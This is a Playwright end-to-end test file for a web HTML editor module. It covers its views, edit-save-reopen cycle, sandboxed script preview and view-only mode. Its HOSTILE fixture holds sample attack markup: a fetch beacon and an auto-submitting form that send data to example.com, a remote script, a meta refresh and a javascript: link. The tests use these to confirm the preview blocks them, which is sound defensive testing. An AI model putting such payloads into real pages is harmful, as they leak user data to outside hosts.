// GO-B4 H-1/H-2 + H2 (UNI-1014): the HTML module frame end to end on the production build
// (`npm run build:web -- --module html`) in the protocol test host, under its CSP headers:
// source <-> split <-> preview, edit, save (bytes), reopen; the preview runs the page's scripts in
// the sandboxed preview.html (a counter script) and visual edit changes a style that lands in the
// source, the save and the reopened document (CONTRACT C15(1)); a host that serves preview.html
// without its own policy falls back to the static preview (no script, form, javascript: link,
// remote image or meta refresh runs or sends a request); view only. Zero console errors, CSP
// violations or off-origin requests; screenshots light + dark, vi + en into
// docs/web-modules/screenshots/html/. The hostile-scripts probes: html-preview-security.spec.ts.
// Run: npx playwright test -c web/e2e html-web
import { test, expect, type Frame, type Page } from '@playwright/test'
import { readFileSync, readdirSync, statSync } from 'node:fs'
import { resolve } from 'node:path'
import {
  BOM,
  built,
  concat,
  cspViolations,
  encode,
  hostState,
  openModule,
  reloadFrame,
  repoRoot,
  screenshotPath,
  serveFixture,
  watch,
  type Problems,
} from './text-modules'

const PAGE = [
  '<!doctype html>',
  '<html lang="en">',
  '  <head>',
  '    <meta charset="utf-8" />',
  '    <title>UniWork HTML web fixture</title>',
  '    <style>body { font-family: sans-serif; margin: 32px; } h1 { color: #185abd; }</style>',
  '  </head>',
  '  <body>',
  '    <h1>UniWork HTML web fixture</h1>',
  '    <p>A paragraph with <strong>bold</strong> text.</p>',
  '  </body>',
  '</html>',
  '',
].join('\r\n')
const FIXTURE = concat(BOM, encode(PAGE))
const EDITED = concat(BOM, encode(PAGE.replace('text.</p>', 'text.</p> Edited on the web.')))

const HOSTILE = [
  '<!doctype html>',
  '<html><head>',
  '<meta http-equiv="refresh" content="1;url=https://example.com/refreshed">',
  '<base href="https://example.com/">',
  '<link rel="stylesheet" href="https://example.com/remote.css">',
  '<style>@import url("https://example.com/imported.css"); body { background: url(https://example.com/bg.png) }</style>',
  '<script>document.title = "script ran"; fetch("https://example.com/beacon")</script>',
  '<script src="https://example.com/remote.js"></script>',
  '</head><body onload="document.body.dataset.ran = 1">',
  '<h1>Hostile fixture</h1>',
  '<img src="https://example.com/pixel.png" alt="remote image" onerror="this.alt = \'handler ran\'">',
  '<a id="js" href="javascript:document.title=\'link ran\'">javascript link</a>',
  '<form id="f" action="https://example.com/steal" method="post"><input name="q" value="secret"></form>',
  '<script>document.getElementById("f").submit()</script>',
  '<iframe src="https://example.com/embedded"></iframe>',
  '</body></html>',
  '',
].join('\n')

const COUNTER = [
  '<!doctype html>',
  '<html lang="en">',
  '  <head>',
  '    <meta charset="utf-8" />',
  '    <title>Counter page</title>',
  '  </head>',
  '  <body>',
  '    <h1 id="title">Counter page</h1>',
  '    <p id="lead">Visual edit target paragraph.</p>',
  '    <button id="inc" type="button">Add one</button> <span id="count">0</span>',
  '    <script>',
  '      let n = 0',
  "      const count = document.getElementById('count')",
  "      document.getElementById('inc').addEventListener('click', () => (count.textContent = String(++n)))",
  "      count.dataset.ready = 'yes'",
  '    </script>',
  '  </body>',
  '</html>',
  '',
].join('\n')

test.skip(!built('html'), 'no dist-web/html build: npm run build:web -- --module html')

const PAGE_PATH = '/e2e-fixtures/Page.html'
const HOSTILE_PATH = '/e2e-fixtures/Hostile.html'
const COUNTER_PATH = '/e2e-fixtures/Counter.html'

/** the preview document (preview.html, opaque origin) once the page was written into it */
function previewFrame(page: Page): Frame | undefined {
  return page.frames().find((f) => f.url().includes('/preview.html'))
}

async function previewText(page: Page): Promise<string> {
  return (await previewFrame(page)?.evaluate(() => document.body?.innerText ?? '')) ?? ''
}

/** the document is loaded (the renderer opens in Preview by default) and the preview shows it */
async function ready(page: Page, frame: Frame, text: string | RegExp) {
  await expect(frame.locator('.workspace')).toBeVisible({ timeout: 30_000 })
  await expect.poll(() => previewText(page), { timeout: 30_000 }).toMatch(text)
}

async function view(frame: Frame, name: RegExp, mode: string) {
  await frame.getByRole('tab', { name }).click()
  await expect(frame.locator(`.workspace.view-${mode}`)).toBeVisible()
}

function newestHtmlBuild(): string {
  const root = resolve(repoRoot, 'dist-web/html')
  return readdirSync(root)
    .map((v) => resolve(root, v))
    .filter((d) => statSync(d).isDirectory())
    .sort(
      (a, b) =>
        statSync(resolve(b, 'manifest.json')).mtimeMs -
        statSync(resolve(a, 'manifest.json')).mtimeMs,
    )[0]
}

function previewSrcdoc(frame: Frame) {
  return frame.locator('iframe.preview-frame').getAttribute('srcdoc')
}

async function expectClean(page: Page, frame: Frame, problems: Problems) {
  const csp = await cspViolations(page, frame)
  expect({ csp, ...problems }).toEqual({ csp: [], console: [], page: [], http: [], external: [] })
}

test('html: views, edit, save, reopen', async ({ page }) => {
  const problems = await watch(page)
  await serveFixture(page, PAGE_PATH, FIXTURE, 'text/html')
  let frame = await openModule(page, 'html', { open: PAGE_PATH, lang: 'en' })
  await ready(page, frame, /UniWork HTML web fixture/)
  // web: no AI, no AutoSave toggle
  expect(await frame.locator('.ai-dock, .ai-entry, .autosave-toggle').count()).toBe(0)

  // the preview runs scripts in preview.html: sandboxed without allow-same-origin, credentialless
  const iframe = frame.locator('iframe.preview-frame')
  await expect(iframe).toHaveAttribute(
    'sandbox',
    'allow-scripts allow-forms allow-popups allow-modals',
  )
  await expect(iframe).toHaveAttribute('credentialless', '')
  await expect(iframe).toHaveAttribute('src', /\/preview\.html\?v=\d+&k=[0-9a-f]{24}$/)

  await view(frame, /^Source$/, 'source')
  await expect(frame.locator('.cm-content')).toBeVisible()
  await view(frame, /^Split$/, 'split')
  await view(frame, /^Preview$/, 'preview')
  await view(frame, /^Split$/, 'split')

  // edit in the source pane: after the paragraph
  await frame.locator('.cm-line', { hasText: 'A paragraph with' }).click()
  await page.keyboard.press('End')
  await page.keyboard.type(' Edited on the web.')
  await expect.poll(() => previewText(page), { timeout: 10_000 }).toContain('Edited on the web.')
  await page.keyboard.press('Control+s')
  await expect.poll(async () => (await hostState(page)).lastSaved?.versionId).toBe('v2')
  expect((await hostState(page)).lastSaved!.bytes).toEqual(Array.from(EDITED))

  // reopen: the latest version, and a save without edits is byte-identical
  frame = await reloadFrame(page)
  await ready(page, frame, /Edited on the web\./)
  await view(frame, /^Split$/, 'split')
  await expect(frame.locator('.cm-content')).toContainText('Edited on the web.')
  await frame.locator('.cm-content').click()
  await page.keyboard.press('Control+s')
  await expect.poll(async () => (await hostState(page)).lastSaved?.versionId).toBe('v3')
  expect((await hostState(page)).lastSaved!.bytes).toEqual(Array.from(EDITED))

  await page.waitForTimeout(1_000)
  await expectClean(page, frame, problems)
})

test('html: scripts run in the preview; visual edit changes a style; save and reopen keep it', async ({
  page,
}) => {
  const problems = await watch(page)
  await serveFixture(page, COUNTER_PATH, encode(COUNTER), 'text/html')
  let frame = await openModule(page, 'html', { open: COUNTER_PATH, lang: 'en' })
  await ready(page, frame, /Counter page/)
  // the page's own script ran (preview.html, opaque origin)
  await expect
    .poll(() => previewFrame(page)?.evaluate(() => document.getElementById('count')?.dataset.ready))
    .toBe('yes')
  expect(await previewFrame(page)!.evaluate(() => self.origin)).toBe('null')

  // visual edit: select the paragraph in the preview, bigger font from the float toolbar
  const preview = frame.locator('iframe.preview-frame').contentFrame()
  await preview.locator('#lead').click()
  const toolbar = frame.getByRole('toolbar', { name: 'Element toolbar' })
  await expect(toolbar).toBeVisible()
  await frame.getByRole('button', { name: 'Increase font size' }).click()
  await view(frame, /^Split$/, 'split')
  await expect(frame.locator('.cm-content')).toContainText(/id="lead" style="font-size: ?\d+px;?"/)
  const styled = (await frame.locator('.cm-content').innerText()).match(/font-size: ?(\d+)px/)![1]
  // the preview reloads with the new source and the script runs again
  await expect
    .poll(() =>
      previewFrame(page)?.evaluate(
        () => getComputedStyle(document.getElementById('lead')!).fontSize,
      ),
    )
    .toBe(`${styled}px`)
  await page.screenshot({ path: screenshotPath('html', 'visual-edit-light-en') })

  // Present (browse): the button is the page's again, the counter counts
  await frame.getByRole('button', { name: 'Present' }).click()
  await frame.getByRole('menuitem', { name: 'In this tab' }).click()
  await expect
    .poll(() => previewFrame(page)?.evaluate(() => document.getElementById('count')?.dataset.ready))
    .toBe('yes')
  await preview.locator('#inc').click()
  await preview.locator('#inc').click()
  await expect(preview.locator('#count')).toHaveText('2')
  await page.screenshot({ path: screenshotPath('html', 'present-counter-light-en') })
  await frame.getByRole('button', { name: /Exit presentation/ }).click()
  await expect(frame.locator('.present-exit')).toHaveCount(0)

  // save -> the bytes carry the style; reopen -> the source and the preview keep it
  await view(frame, /^Split$/, 'split')
  await frame.locator('.cm-content').click()
  await page.keyboard.press('Control+s')
  await expect.poll(async () => (await hostState(page)).lastSaved?.versionId).toBe('v2')
  const saved = new TextDecoder().decode(new Uint8Array((await hostState(page)).lastSaved!.bytes))
  expect(saved).toContain(`<p id="lead" style="font-size: ${styled}px`)
  expect(saved).not.toContain('data-sid')
  expect(saved).not.toContain('data-gx-inspector')
  expect(saved.replace(/ style="[^"]*"/, '')).toBe(COUNTER)
  frame = await reloadFrame(page)
  await ready(page, frame, /Counter page/)
  await expect
    .poll(() =>
      previewFrame(page)?.evaluate(
        () => getComputedStyle(document.getElementById('lead')!).fontSize,
      ),
    )
    .toBe(`${styled}px`)
  await page.waitForTimeout(1_000)
  await expectClean(page, frame, problems)
})

test('html: preview.html served without its own policy -> static preview, nothing runs', async ({
  page,
}) => {
  const problems = await watch(page)
  // a host that applies the frame policy to every file of the bundle: the boot script is blocked
  const dir = newestHtmlBuild()
  const rules = JSON.parse(readFileSync(resolve(dir, 'headers.json'), 'utf8')).rules as Array<{
    source: string
    headers: Record<string, string>
  }>
  const framePolicy = rules.find((r) => r.source === '/index.html')!.headers[
    'Content-Security-Policy'
  ]
  await page.route('**/preview.html?*', (route) =>
    route.fulfill({
      status: 200,
      body: readFileSync(resolve(dir, 'preview.html')),
      headers: {
        'content-type': 'text/html; charset=utf-8',
        'content-security-policy': framePolicy,
      },
    }),
  )
  await serveFixture(page, HOSTILE_PATH, encode(HOSTILE), 'text/html')
  const frame = await openModule(page, 'html', { open: HOSTILE_PATH, lang: 'en' })
  await expect(frame.locator('.workspace')).toBeVisible({ timeout: 30_000 })
  await view(frame, /^Preview$/, 'preview')
  const iframe = frame.locator('iframe.preview-frame')
  await expect(iframe).toHaveAttribute('sandbox', '', { timeout: 30_000 })
  await expect(iframe).toHaveAttribute('credentialless', '')
  await expect.poll(() => previewSrcdoc(frame)).toContain('Hostile fixture')
  const srcdoc = (await previewSrcdoc(frame))!
  expect(srcdoc).not.toMatch(
    /<script|onload=|onerror=|http-equiv|<base|<iframe|javascript:|example\.com/i,
  )

  // give a meta refresh / script / form submit time to act, then click the javascript: link
  await page.waitForTimeout(2_500)
  const preview = page
    .frames()
    .find((f) => f.parentFrame() === frame && f.url() === 'about:srcdoc')!
  await frame.locator('iframe.preview-frame').contentFrame().locator('#js').click()
  await page.waitForTimeout(500)
  expect(preview.url()).toBe('about:srcdoc')
  // the frame itself is untouched (title is the host's file name, no script ran anywhere)
  expect(await frame.evaluate(() => document.title)).not.toMatch(/ran/)
  await page.screenshot({ path: screenshotPath('html', 'hostile-preview-light-en') })
  // the blocked boot script is the one intended refusal (in the preview document)
  problems.console = problems.console.filter(
    (m) => !/preview\.html|Content Security Policy|did not start/.test(m),
  )
  await expectClean(page, frame, problems)
})

test('html: view only without the save grant', async ({ page }) => {
  const problems = await watch(page)
  await serveFixture(page, PAGE_PATH, FIXTURE, 'text/html')
  const frame = await openModule(page, 'html', { open: PAGE_PATH, lang: 'en', readonly: '1' })
  await ready(page, frame, /UniWork HTML web fixture/)
  // the host announces view-only (banner + live region); the frame adds no third copy
  await expect(frame.locator('.status-view-only')).toHaveCount(0)
  await view(frame, /^Source$/, 'source')
  await frame.locator('.cm-line', { hasText: 'A paragraph with' }).click()
  await page.keyboard.type('typed')
  await page.keyboard.press('Control+s')
  await page.waitForTimeout(1_000)
  await expect(frame.locator('.cm-content')).not.toContainText('typed')
  expect((await hostState(page)).lastSaved).toBeNull()
  await page.screenshot({ path: screenshotPath('html', 'view-only-light-en') })
  await expectClean(page, frame, problems)
})

for (const theme of ['light', 'dark'] as const) {
  for (const lang of ['en', 'vi'] as const) {
    test(`html: screenshot ${theme} ${lang}`, async ({ page }) => {
      const problems = await watch(page)
      await serveFixture(page, PAGE_PATH, FIXTURE, 'text/html')
      const frame = await openModule(page, 'html', { open: PAGE_PATH, lang, theme })
      await ready(page, frame, /UniWork HTML web fixture/)
      await frame.locator('.workspace').waitFor()
      await frame.getByRole('tab').nth(1).click()
      await expect(frame.locator('.workspace.view-split')).toBeVisible()
      await expect
        .poll(() => frame.evaluate(() => document.documentElement.lang))
        .toMatch(new RegExp(`^${lang}`))
      await page.waitForTimeout(1_500)
      await page.screenshot({ path: screenshotPath('html', `split-${theme}-${lang}`) })
      await expectClean(page, frame, problems)
    })
  }
}
